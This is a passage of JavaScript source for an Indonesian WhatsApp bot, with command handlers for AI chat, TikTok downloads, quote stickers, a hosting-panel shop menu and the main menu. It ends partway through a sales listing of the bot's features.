    let trukss = m.sender
    if (trukss === botNumber) return;
    if (!text) return replykurumi('apa hah, mau di cium?')
    let name = TradzSigma.getName(m.sender)
    try { 
        const hm = await fetch("https://cai.neekoi.me/cai?char=VWqzF2JBg4dqUgCgbvhfAcBDNUbV4EsWiWAh-W_qZvc&message=" + encodeURIComponent(text))
        const hasil = await hm.json()     
        const answer = hasil.reply || "Maaf, saya tidak dapat memahami pesan Anda"
        replykurumi(answer)
    } catch (error) {
        console.error("Error fetching data:", error)
        replykurumi("Maaf, terjadi kesalahan: " + error.message)
    }
}
break
case 'ttaudio':
case 'tiktokaudio':{
if (!text) return reply(`⚠️ Hmm... Kamu belum kasih link nih! 🫣 Coba ketik kayak gini ya: *${prefix + command} <url>*`);
				try {
					let anu = await tiktokDownloaderVideo(text);
					let audio = anu.music_info.url;
					await TradzSigma.sendMessage(
						m.chat,
						{
							text: `🎵 *TikTok Audio*\n\n` +
							`🎼 *Judul*: ${anu.music_info.title || '-'}\n` +
							`🎤 *Author*: ${anu.music_info.author || '-'}\n` +
							`💿 *Album*: ${anu.music_info.album || '-'}\n\n` +
							`🔗 *Source*: ${text}`
						},
						{ quoted: m }
					);
					await TradzSigma.sendMessage(
						m.chat,
						{
							audio: { url: audio },
							mimetype: 'audio/mpeg',
							fileName: `${anu.music_info.title || 'audio'}.mp3`
						},
						{ quoted: m }
					);
				} catch (error) {
					console.error(error);
					await replyviex(`❌ Terjadi kesalahan saat mengambil audio. Coba lagi nanti, ya Kak!`);
				}
			}
break
//=============[ OWNER - COMMAND ]================
        //============
        case 'tiktokslide':
			case 'ttslide':
			case 'tiktokfoto':
			case 'tiktokmp4':
			case 'ttnowm':
			case 'tiktoknowm':{
				if (!text) return replyviex(`⚠️ Hmm... Kamu belum kasih link nih! 🫣 Coba ketik kayak gini ya: *${prefix + command} <url>*`);
				try {
					TradzSigma.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
					let anu = await tiktokDownloaderVideo(text);
					let item = 0;
					for (let imgs of anu.data) {
						if (imgs.type == "nowatermark") {
							await TradzSigma.sendMessage(
								m.chat,
								{
									video: { url: imgs.url }, caption: 
`\`[  ᴠɪᴅᴇᴏ ɪɴғᴏ : ]\`
> ʀᴇɢɪᴏɴ : ${anu.region}
> ᴛᴀᴋᴇɴ : ${anu.taken_at}\n\n
\`[ sᴛᴀᴛɪsᴛɪᴋ ɪɴғᴏ : ]\`
> ᴠɪᴇᴡᴇʀs : ${anu.stats.views}
> ʟɪᴋᴇs : ${anu.stats.likes}
> ᴄᴏᴍᴍᴇɴᴛ : ${anu.stats.comment}
> sʜᴀʀᴇ : ${anu.stats.share}
> ᴅᴏᴡɴʟᴏᴀᴅ : ${anu.stats.download}\n\n
\`[  ᴀᴜᴛʜᴏʀ ɪɴғᴏ : ]\`
> ғᴜʟʟɴᴀᴍᴇ : ${anu.author.fullname}
> ɴɪᴄᴋɴᴀᴍᴇ : ${anu.author.nickname}\n\n
> ᴄᴀᴘᴛɪᴏɴ : ${anu.title || 'No Caption'}`
								},
								{ quoted: m }
							);
						}
						if (imgs.type == "photo") {
							if (item == 0) {
								await TradzSigma.sendMessage(
									m.chat,
									{
										image: { url: imgs.url },
										caption: 
`\`[  ᴘʜᴏᴛᴏ ɪɴғᴏ : ]\`
> ʀᴇɢɪᴏɴ : ${anu.region}
> ᴛᴀᴋᴇɴ : ${anu.taken_at}\n\n
\`[ sᴛᴀᴛɪsᴛɪᴋ ɪɴғᴏ : ]\`
> Views: ${anu.stats.views}
> Likes: ${anu.stats.likes}
> ᴄᴏᴍᴍᴇɴᴛ : ${anu.stats.comment}
> sʜᴀʀᴇ : ${anu.stats.share}
> ᴅᴏᴡɴʟᴏᴀᴅ : ${anu.stats.download}\n\n
\`[  ᴀᴜᴛʜᴏʀ ɪɴғᴏ : ]\`
> ғᴜʟʟɴᴀᴍᴇ : ${anu.author.fullname}
> ɴɪᴄᴋɴᴀᴍᴇ : ${anu.author.nickname}\n\n
> ᴄᴀᴘᴛɪᴏɴ : ${anu.title || 'No Caption'}${m.isGroup ? anu.data.length > 1 ? 
"\n📥 _sɪsᴀ ғᴏᴛᴏ ᴅɪᴋɪʀɪᴍ ᴋᴇ ᴘʀɪᴠᴀᴛᴇ ᴄʜᴀᴛ_\n" : "\n" : "\n"}`
									},
									{ quoted: m }
								);
							} else {
								await TradzSigma.sendMessage(
									m.sender,
									{
										image: { url: imgs.url }
									},
									{ quoted: m }
								);
							}
							item += 1;
							await sleep(2000);
						}
					}
				} catch (err) {
					console.log(err);
					replyviex('⚠️ Gagal mengambil data dari TikTok. Pastikan URL valid atau coba lagi nanti.');
				}
			}
			
			break;
			case 'qcwarna': {
if (!q) return replyviex(`☘️ *Contoh : Qc White yoimiya*\n🎁 *Kode Warna Ketik : Qckode*`)
TradzSigma.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
if (text.length > 800) return replyviex(`☘️ *Maksimal 800 Karakter*`)
let [color, ...message] = text.split(' ');
message = message.join(' ');
let backgroundColor;
switch(color) {
case 'pink': 
case 'Pink':
backgroundColor = '#f68ac9';
break;

case 'blue':
case 'Blue':
backgroundColor = '#6cace4';
break;

case 'red':
case 'Red':
backgroundColor = '#f44336';
break;

case 'green':
case 'Green':
backgroundColor = '#4caf50';
break;

case 'yellow':
case 'Yellow':
backgroundColor = '#ffeb3b';
break;

case 'purple':
case 'Purple':
backgroundColor = '#9c27b0';
break;

case 'darkblue':
case 'Darkblue':
backgroundColor = '#0d47a1';
break;

case 'lightblue':
case 'Lightblue':
backgroundColor = '#03a9f4'; 
break;

case 'ash':
case 'Ash':
backgroundColor = '#9e9e9e';
break;

case 'orange':
case 'Orange':
backgroundColor = '#ff9800';
break;

case 'black':
case 'Black':
backgroundColor = '#000000';
break;

case 'white': 
case 'White':
backgroundColor = '#ffffff';
break;

case 'teal':
case 'Teal':
backgroundColor = '#008080';
break;

case 'lightpink':
case 'Lightpink':
backgroundColor = '#FFC0CB';
break;

case 'chocolate':
case 'Chocolate':
backgroundColor = '#A52A2A';
break;

case 'salmon':
case 'Salmon':
backgroundColor = '#FFA07A'; 
break;

case 'magenta':
case 'Magenta':
backgroundColor = '#FF00FF'; 
break; 

case 'tan':
case 'Tan':
backgroundColor = '#D2B48C'; 
break;

case 'wheat':
case 'Wheat':
backgroundColor = '#F5DEB3'; 
break;

case 'deeppink':
case 'Deeppink':
backgroundColor = '#FF1493'; 
break; 

case 'fire':
case 'Fire':
backgroundColor = '#B22222';
break;

case 'skyblue':
case 'Skyblue':
backgroundColor = '#00BFFF';
break; 

case 'orange':
case 'Orange':
backgroundColor = '#FF7F50';
break;

case 'brightskyblue':
case 'Brightskyblue':
backgroundColor = '#1E90FF'; 
break; 

case 'hotpink':
case 'Hotpink':
backgroundColor = '#FF69B4'; 
break; 

case 'lightskyblue':
case 'Lightskyblue':
backgroundColor = '#87CEEB'; 
break; 

case 'seagreen':
case 'Seagreen':
backgroundColor = '#20B2AA'; 
break;

case 'darkred':
case 'Darkred':
backgroundColor = '#8B0000'; 
break; 

case 'orangered':
case 'Orangered':
backgroundColor = '#FF4500'; 
break; 

case 'cyan':
case 'Cyan':
backgroundColor = '#48D1CC'; 
break; 

case 'violet':
case 'Violet':
backgroundColor = '#BA55D3'; 
break; 

case 'mossgreen':
case 'Mossgreen':
backgroundColor = '#00FF7F'; 
break; 

case 'darkgreen':
case 'Darkgreen':
backgroundColor = '#008000'; 
break; 

case 'navyblue':
case 'Navyblue':
backgroundColor = '#191970'; 
break; 

case 'darkorange':
case 'Darkorange':
backgroundColor = '#FF8C00'; 
break; 

case 'darkpurple':
case 'Darkpurple':
backgroundColor = '#9400D3'; 
break; 

case 'fuchsia':
case 'Fuchsia':
backgroundColor = '#FF00FF'; 
break; 

case 'darkmagenta':
case 'Darkmagenta':
backgroundColor = '#8B008B'; 
break;

case 'darkgray':
case 'Darkgray':
backgroundColor = '#2F4F4F'; 
break;

case 'peachpuff':
case 'Peachpuff':
backgroundColor = '#FFDAB9'; 
break;

case 'darkishgreen':
case 'Darkishgreen':
backgroundColor = '#BDB76B'; 
break;

case 'darkishred':
case 'Darkishred':
backgroundColor = '#DC143C'; 
break;

case 'goldenrod':
case 'Goldenrod':
backgroundColor = '#DAA520'; 
break;

case 'darkishgray':
case 'Darkishgray':
backgroundColor = '#696969'; 
break;

case 'darkishpurple':
case 'Darkishpurple':
backgroundColor = '#483D8B'; 
break;

case 'gold':
case 'Gold':
backgroundColor = '#FFD700'; 
break;

case 'silver':
case 'Silver':
backgroundColor = '#C0C0C0'; 
break;
default:
return replyviex('⚠ *Bukan begitu tapi begini contohnya, .qc white (teksnya) nah begitu. untuk melihat kode warna silahkan .qckode*')
}
let obj = {
type: 'quote',
format: 'png',
backgroundColor,
width: 512,
height: 768,
scale: 2,
messages: [
{
entities: [],
avatar: true,
from: {
id: 1,
name: pushname,
photo: { 
url: await TradzSigma.profilePictureUrl(m.sender, "image").catch(() => 'https://telegra.ph/file/6880771a42bad09dd6087.jpg'),
}
},
text: message,
replyMessage: {},
},
],
};
let response = await axios.post('https://bot.lyo.su/quote/generate', obj, {
headers: {
'Content-Type': 'application/json',
},
});
let buffer = Buffer.from(response.data.result.image, 'base64');
TradzSigma.sendImageAsSticker(m.chat, buffer, m, { packname: `${global.packname}`, author: `${global.author}`})
}
break
case 'qc': {
  if (!q) return replyviex(`Send command with text. ${prefix + command} Hai`);
  let obj = {
    type: 'quote',
    format: 'png',
    backgroundColor: '#ffffff',
    width: 512,
    height: 768,
    scale: 2,
    messages: [
      {
        entities: [],
        avatar: true,
        from: {
          id: 1,
          name: `${pushname}`,
          photo: { 
            url: await TradzSigma.profilePictureUrl(m.sender, "image").catch(() => 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'),
          }
        },
        text: `${q}`,
        replyMessage: {},
      },
    ],
  };
  let response = await axios.post('https://bot.lyo.su/quote/generate', obj, {
    headers: {
      'Content-Type': 'application/json',
    },
  });
  let buffer = Buffer.from(response.data.result.image, 'base64');
  TradzSigma.sendImageAsSticker(m.chat, buffer, m, { packname: `${global.packname}`, author: `${global.author}` });
}
break;

// https://bot.lyo.su/quote/generate
// https://qc.sazumi.moe/generate
// https://quotly.netorare.codes 

case 'qckode': {
replyviex(`📦 *Kode Warna Qc*
 *⨠ Pink*
 *⨠ Blue*
 *⨠ Red*
 *⨠ Green*
 *⨠ Yellow*
 *⨠ Purple*
 *⨠ Darkblue*
 *⨠ Lightblue*
 *⨠ Ash*
 *⨠ Orange*
 *⨠ Black*
 *⨠ White*
 *⨠ Teal*
 *⨠ Lightpink*
 *⨠ Chocolate*
 *⨠ Salmon*
 *⨠ Magenta*
 *⨠ Tan*
 *⨠ Wheat*
 *⨠ Deeppink*
 *⨠ Fire*
 *⨠ Skyblue*
 *⨠ Safron*
 *⨠ Brightskyblue*
 *⨠ Hotpink*
 *⨠ Lightskyblue*
 *⨠ Seagreen*
 *⨠ Darkred*
 *⨠ Orangered*
 *⨠ Cyan*
 *⨠ Violet*
 *⨠ Mossgreen*
 *⨠ Darkgreen*
 *⨠ Navyblue*
 *⨠ Darkorange*
 *⨠ Darkpurple*
 *⨠ Fuchsia*
 *⨠ Darkmagenta*
 *⨠ Darkgray*
 *⨠ Peachpuff*
 *⨠ Blackishgreen*
 *⨠ Darkishred*
 *⨠ Goldenrod*
 *⨠ Darkishgray*
 *⨠ Darkishpurple*
 *⨠ Gold*
 *⨠ Silver*

⚠️ *Kalo Ada Error Bisa Chat Owner Ya*
`)
}
break
case 'shopmenu': case 'listproduk': {
  let teks = `
    〔 ✨ *TradzSigma* ✨ 〕
━━━━━━━━━━━━━━━━━━━━━━
👋 *Selamat Datang Di TradzShop!*

🎗 *TradzSigma Melayani Seperti Hosting, Dll*
🏆 *Tempat terbaik untuk memenuhi kebutuhan digital Anda!*
⚡ *Pilih Produk Dibawah Ini untuk membeli!*
━━━━━━━━━━━━━━━━━━━━━━
  `;
  TradzSigma.sendMessage(m.chat, {
    image: fs.readFileSync("./library/data/media/Tradz.jpg"),
    caption: teks,
    footer: `wa.me/6283844671188`,
    buttons: [
      {
        buttonId: 'single_select',
        buttonText: { displayText: '🛒 Klik Untuk Melihat Produk' },
        type: 1,
        nativeFlowInfo: {
          name: 'single_select',
          paramsJson: JSON.stringify({
            title: " ShopMenu",
            sections: [
              {
                title: "💰 Deposit Otomatis",
                rows: [
                  { title: "💳 Deposit Otomatis", description: "Isi saldo dengan mudah.", id: ".deposit" }
                ]
              },
              {
                title: "🖥️ Pterodactyl Panel & Admin Panel",
                rows: [
                  { title: "🚀 Buy Panel", description: "Panel Pterodactyl.", id: ".belipanel" },
                  { title: "⚙️ Admin Panel", description: "Akses Admin.", id: ".buyadp" },
                  { title: "👥 Partner Panel", description: "Dapatkan Patner panel.", id: ".buyptp" },
                  { title: "👑 Owner Panel", description: "Akses eksklusif!", id: ".buyownp" }
                ]
              }
            ]
          })
        }
      }
    ],
    headerType: 4, // HeaderType 4 agar gambar dan caption tampil dengan baik
    viewOnce: true,
  }, { quoted: m });
}
break;
//=================================================
case "menu-v1":
case "menu": {
TradzSigma.sendMessage(m.chat, { react: { text: `🔍`, key: m.key }})
if (!isRegistered) return replydaftar('👋 Halo kak, anda belum bisa mengakses bot nih daftar dulu ya.\n\n╭──「 \`CARA DAFTAR\` 」─✦\n│⦿ 〔 Cara : .daftar nama.umur\n│⦿ 〔 Contoh : .daftar TradzID.20\n│⦿ 〔 Botname : JinshiMD✨\n╰───────────────────✦\n\nDENGAN DAFTAR KAMU BISA AKSES BOT SEPUASNYA\n\n💂‍♀: Kenapa harus daftar sih?\n🍁: Agar bot mengenal siapa anda\n💂‍♀: Ribet banget harus daftar segala\n🍁: Jika tidak daftar, Anda tidak bisa menggunakan fitur bot')
  const anjay = ` 
 ʜᴇʟʟᴏ *👋 ${pushname}*  

 sᴇʟᴀᴍᴀᴛ *${Waktu}*  
 ⤷ ʜᴀʀɪ ʏᴀɴɢ ʜᴇʙᴀᴛ,
 
 sᴀʏᴀ ᴀᴅᴀʟᴀʜ ʙᴏᴛ ᴀssɪsᴛᴀɴᴛ ᴜɴᴛᴜᴋ ᴍᴇʟᴀʏᴀɴɪ ᴀɴᴅᴀ sᴇʜᴀʀɪ-ʜᴀʀɪ, ᴊɪᴋᴀ ᴋᴀᴍᴜ ᴘᴜɴʏᴀ ᴍᴀsᴀʟᴀʜ ᴀᴛᴀᴜ ᴋᴇsᴇᴘɪᴀɴ ʙᴏʟᴇʜ sᴀᴊᴀ ᴋᴀʟɪᴀɴ ᴍᴀɪɴ ʙᴏᴛ ɪɴɪ ᴜɴᴛᴜᴋ ᴍᴇʀᴇᴅᴀᴋᴀɴ sᴛʀᴇss,
  
❏ *INFO BOT* ❏─────✦  
 ⎆ ʀᴜɴᴛɪᴍᴇ  : ${runtime(process.uptime())}  
 ⎆ ᴠᴇʀsɪ    : ${global.version}  
 ⎆ ʀᴇsᴘᴏɴ   : ${latensi.toFixed(4)}
 ⎆ ᴛᴀɴɢɢᴀʟ : ${tanggal}  
✦─────────────✦

❏ *STATUS KAMU* ❏  
 ⤷ ʏᴏᴜʀ sᴛᴀᴛᴜs ᴀʀᴇ : *( ${TradID ? 'ʙᴏss🥇' : isPrem ? 'ɪɴᴠᴇsᴛᴏʀ💵' : 'ɢʀᴀᴛɪsᴀɴ😩'} )*  
  
❏ *PENTING!* ❏  
> ᴍᴏʜᴏɴ ᴜɴᴛᴜᴋ ᴍᴇᴍʙᴀᴄᴀ ʀᴜʟᴇs ʙᴏᴛ ʙɪᴀʀ ᴛᴇʀʜɪɴᴅᴀʀ ᴅᴀʀɪ ᴋᴇɴᴏɴ
> ᴋɴᴘ ʙᴀɴɢ?, ʜᴇʏ ɢᴡ ᴋᴀsɪʜ ᴛᴀᴜ ʏᴀ ʟᴜ sᴘᴀᴍ ɪᴛᴜ ʙɪᴋɪɴ ʙᴏᴛ ɴʏᴇᴘᴀᴍ
  
❏ *KENAPA?* ❏
 ʏᴀ ᴋᴀʀᴇɴᴀ sᴘᴀᴍ ʙɪsᴀ ʙɪᴋɪɴ ʙᴏᴛ ɴʏᴇᴘᴀᴍ  
 ᴀᴋʜɪʀɴʏᴀ ᴋᴇɴᴏɴ ᴅᴇʜ
  
⎙ ᴋʟᴀᴜ ᴀᴅᴀ ғɪᴛᴜʀ ʙᴜɢ / ᴇʀʀᴏʀ, sɪʟᴀᴋᴀɴ ʜᴜʙᴜɴɢɪ *ᴏɴᴡᴇʀ*

${generateFandomCode() }
  `;

  try {
    const thumbImage = fs.existsSync("./library/data/media/Tradz.jpg") ? fs.readFileSync("./library/data/media/Tradz.jpg") : null;
  
    const messageContent = {
      document: { url: `https://files.catbox.moe/66ewqy.jpg` },
      mimetype: "image/png",
      fileName: ucapanWaktu,
      fileLength: 999,
      pageCount: 999,
      jpegThumbnail: thumbImage ? await resize(thumbImage, 400, 400) : null,
    caption: anjay,
    footer: `${global.footer}`,
      buttons: [
        { buttonId: ".owner", buttonText: { displayText: "owner" }, type: 1 },
        { buttonId: ".allmenu", buttonText: { displayText: "all menu" }, type: 1 },
        {
          buttonId: "action",
          buttonText: { displayText: "𝗣𝗶𝗹𝗶𝗵𝗮𝗻 𝗠𝗲𝗻𝘂" },
          type: 3,
          nativeFlowInfo: {
            name: 'single_select',
paramsJson: JSON.stringify({
title: "LIST MENU",
    sections: [
  {
    title: `ʟɪsᴛ ʏᴀɴɢ sᴇʀɪɴɢ ᴅɪᴘᴀᴋᴀɪ`,
    highlight_label: `🔥ᴘᴏᴘᴜʟᴇʀ`,
    rows: [
      {
        header: "🧭 All Menu",
        title: "🗂️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴍᴇɴᴜ ᴀʟʟ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.allmenu`, 
      },
    ],
  },
  {
    title: `ᴍɪɴᴇᴄʀᴀғᴛ sᴛᴀᴛᴜs ғɪᴛᴜʀ`,
    highlight_label: ``,
    rows: [
      {
        header: "⛏️ MC Status",
        title: "🧱 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴄ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.mcstatus`, 
      },
    ],
  },
  {
    title: `ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ`,
    highlight_label: `🛠️ᴘᴇᴍʙᴀʀᴜᴀɴ ғɪᴛᴜʀ`,
    rows: [
      {
        header: "🆕 New Updates",
        title: "📢 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ᴛᴇʀʙᴀʀᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.newupdatebutton`, 
      },
      {
        header: "🛠️ Fix Fitur",
        title: "🧩 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʏᴀɴɢ ᴅɪғɪx",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.fixbutton`, 
      },
      {
        header: "🛍 Shop menu",
        title: "📦 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ꜰɪᴛᴜʀ sʜᴏᴘᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.shopmenubutton`, 
      },
      {
        header: "⚡ Cpanel menu",
        title: "🛒 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ꜰɪᴛᴜʀ ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.cpanelbutton`, 
      },
    ],
  },
  {
    title: `ʟɪsᴛ ᴍᴇɴᴜ ʏᴀɴɢ ᴅɪᴘɪsᴀʜᴋᴀɴ`,
    highlight_label: ``,
    rows: [
      {
        header: "📜 Peraturan",
        title: "⚖️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴜʟᴇs ʙᴏᴛ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.bacaperaturanbutton`, 
      },
      {
        header: "🎁 Donasi",
        title: "💖 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴅᴏɴᴀsɪ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.donasibutton`, 
      },
      {
        header: "🤖 AI Menu",
        title: "✨ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴀɪ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.aimenubutton`, 
      },
      {
        header: "🎉 Fun Menu",
        title: "🤣 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ғᴜɴ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.funmenubutton`, 
      },
      {
        header: "🕹️ RPG Menu",
        title: "⚔️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ʀᴘɢ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.rpgmenubutton`, 
      },
      {
        header: "📤 Push Menu",
        title: "📨 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ᴘᴜsʜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.pushmenubutton`, 
      },
      {
        header: "🎥 Asupan Menu",
        title: "🥤 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴀsᴜᴘᴀɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.nsfwmenubutton`, 
      },
      {
        header: "🧩 Game Menu",
        title: "🎮 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ɢᴀᴍᴇ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.gamemenubutton`, 
      },
      {
        header: "🛍️ Store Menu",
        title: "🛒 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛᴏʀᴇ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.storemenubutton`, 
      },
      {
        header: "🎌 Anime Menu",
        title: "📺 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ᴀɴɪᴍᴇ ᴘᴀɴᴇʟ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.animebutton`, 
      },
      {
        header: "🌀 Other Menu",
        title: "🧃 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴛᴀᴍʙᴀʜᴀɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.othermenubutton`, 
      },
      {
        header: "⚙️ Owner Menu",
        title: "👑 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.ownermenubutton`, 
      },
      {
        header: "🫂 Grup Menu",
        title: "👥 ᴜɴᴛᴜᴋ ᴍᴇɴɪʜᴀᴛ ʟɪsᴛ ɢʀᴜᴘ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.groupmenubutton`, 
      },
      {
        header: "🕌 Islamic Menu",
        title: "📿 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.islamimenubutton`, 
      },
      {
        header: "📰 Berita Menu",
        title: "🗞️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.beritamenubutton`, 
      },
      {
        header: "✨ Quotes Menu",
        title: "📝 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.quotesmenubutton`, 
      },
      {
        header: "🖼️ Sticker Menu",
        title: "💬 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.stickermenubutton`, 
      },
      {
        header: "🔍 Stalking Menu",
        title: "🧿 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛᴀʟᴋɪɴɢ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.stalkermenubutton`, 
      },
      {
        header: "🔮 Primbon Menu",
        title: "🕯️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.primbonmenubutton`, 
      },
      {
        header: "🎖️ Certificate Menu",
        title: "📜 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇʀᴛɪғɪᴋᴀᴛ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.sertifikatmenubutton`, 
      },
      {
        header: "⬇️ Download Menu",
        title: "📥 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.downloadmenubutton`, 
      },
      {
        header: "📸 Ephoto Menu",
        title: "🖌️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴇᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.ephoto360menubutton`, 
      },
      {
        header: "🎭 Anonymous Menu",
        title: "🕵️‍♂️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.anonymousmenubutton`, 
      },
      {
        header: "🎲 Random Video",
        title: "📹 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.randomvideomenubutton`, 
      },
      {
        header: "🎬 Random Photo",
        title: "🖼️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.randomphotomenubutton`, 
      },
    ],
  },
  {
    title: `ɪɴғᴏʀᴍᴀsɪ ʏᴏɪᴍɪʏᴀ ᴀssɪsᴛᴇɴᴛ`,
    highlight_label: `ᴘᴏᴘᴜʟᴇʀ`,
    rows: [
      {
        title: "🎗 ɪɴғᴏ ʙᴏᴛ",
        description: "ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ",
        id: `.infobot`,
      },
      {
        title: "💫 ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
        description: "ᴋᴇᴍʙᴀʟɪ ᴋᴇ ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
        id: `.menu`, 
      },
                  ]
                }
              ]
            }),
          },
        },
      ],
      contextInfo: {
        forwardingScore: 99,
        externalAdReply: {
          body: "© Copyright by Tradz",
          containsAutoReply: true,
          mediaType: 1,
          renderLargerThumbnail: true,
          showAdAttribution: true,
          sourceUrl: "https://whatsapp.com/channel/0029Vb5tjub8F2p55FXaN80p",
          thumbnail: thumbImage,
          thumbnailUrl: "https://files.catbox.moe/ns0ovd.jpeg",
          title: namabot,
        },
      },
      viewOnce: true,
    };

await TradzSigma.sendMessage(m.chat, messageContent, { quoted: qloc });

await TradzSigma.sendMessage(
      m.chat,
      {
        audio: { url: "https://files.catbox.moe/2r2gty.mp3" }, // Ganti dengan URL audio
        mimetype: "audio/mpeg",
        ptt: true,
      },
      { quoted: qloc }
    );


      } catch (error) {
    console.error("Error sending menu:", error);
    await TradzSigma.sendMessage(m.chat, { text: "⚠️ Terjadi kesalahan saat mengirim menu." });
  }
  
}
break;
case "script": case "sc": {
let buy = `
*🛒 Sell Script Bot Jinshi MD*

🧾 Features On Bot
*Cpanel Pterodactyl*
* Cpanel Srv1
* Cpanel Srv2
* Cpanel Srv3
*Features Download*
* Instagram
* Superhd
* Brat video
* Spotify
* TikTok
* TikTok (HD)
* Facebook
* Facebook (HD)
* Pinteres slide
* Videy
* YT Download (Mp3/Mp4) Using Scraper
* (Full Scraper)
* DLL
*NSFW Menu*
* Xnxx Search
* Xnxx Download
* Bokep
* Hentai
*Features Game*
* Rpg game
* Cek Femboy
* TebakKata
* TebakBom
* TebakAnime
* TebakGame
* TebakLirik
* TebakLagu
* SiapakahAku?
